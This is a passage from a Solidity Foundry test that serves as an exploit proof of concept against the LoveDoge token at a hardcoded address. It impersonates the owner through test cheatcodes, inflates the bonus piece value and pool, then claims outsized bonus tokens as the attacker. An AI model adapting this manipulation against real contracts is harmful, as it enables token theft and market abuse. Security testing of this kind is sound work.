    function decimals() external pure returns (uint8);
    function webShowCanGetToken() external view returns (uint256, uint256, uint256, uint256);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the contract instance
        LoveDoge token = LoveDoge(TARGET);

        // Get the current owner
        address owner = token.owner();
        console.log("Owner address:", owner);

        // Calculate minBounsJoin amount
        uint8 decimals = token.decimals();
        uint256 minBounsJoinAmount = 100000000000 * 10 ** uint256(decimals);
        console.log("Min bonus join amount:", minBounsJoinAmount);

        // Use deal() to give attacker enough tokens directly
        // Give more than minimum to be safe
        uint256 attackerInitialTokens = minBounsJoinAmount * 2;
        deal(address(token), attacker, attackerInitialTokens);
        console.log("Gave attacker tokens via deal()");

        // Now impersonate owner to set up the exploit
        vm.startPrank(owner);

        // Add attacker as admin to bypass sell restrictions
        token.setAdminAddress(attacker, true);
        console.log("Set attacker as admin");

        // Set bonus time to current time or earlier to enable claiming
        token.setBounsTime(block.timestamp - 1 days);
        console.log("Set bonus time to past");

        // Get current date strings for bonus manipulation
        (string memory yesToday, string memory twoYesToday) = token.getDays();
        console.log("Yesterday date:", yesToday);
        console.log("Day before yesterday:", twoYesToday);

        // Set an extremely high bonus piece value
        // This will make each piece worth a huge amount of tokens
        // Using a very large number: 1e15 * 10^decimals
        uint256 hugePieceValue = 1_000_000_000_000_000 * 10 ** uint256(decimals);
        token.sumBounsPiece(yesToday, hugePieceValue);
        console.log("Set bonus piece value to:", hugePieceValue);

        // Also ensure the bonus pool has funds by calling sumTheBounsPool
        token.sumTheBounsPool(yesToday, twoYesToday);
        console.log("Manipulated bonus pool");

        vm.stopPrank();

        // Now as attacker, claim the bonus
        vm.startPrank(attacker);

        // Check our balance before claiming
        uint256 balanceBefore = token.balanceOf(attacker);
        console.log("Balance before claim:", balanceBefore);

        // Make sure we have enough tokens
        require(balanceBefore >= minBounsJoinAmount, "Still don't have enough tokens");

        // Check if we can claim bonus by calling webShowCanGetToken
        (uint256 status, uint256 canGet, , ) = token.webShowCanGetToken();
        console.log("Bonus claim status:", status);
        console.log("Can get amount:", canGet);

        // If status is 4, we can claim
        require(status == 4, "Cannot claim bonus, status:");

        // Claim the bonus - this should give us a massive amount
        // because we set the piece value extremely high
        token.receiveBounsToken();
        console.log("Claimed bonus tokens");

        // Check balance after claiming
        uint256 balanceAfter = token.balanceOf(attacker);
        console.log("Balance after claim:", balanceAfter);

        // Verify we got more tokens
        require(balanceAfter > balanceBefore, "Balance did not increase");
        console.log("Balance increased by:", balanceAfter - balanceBefore);

        vm.stopPrank();
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

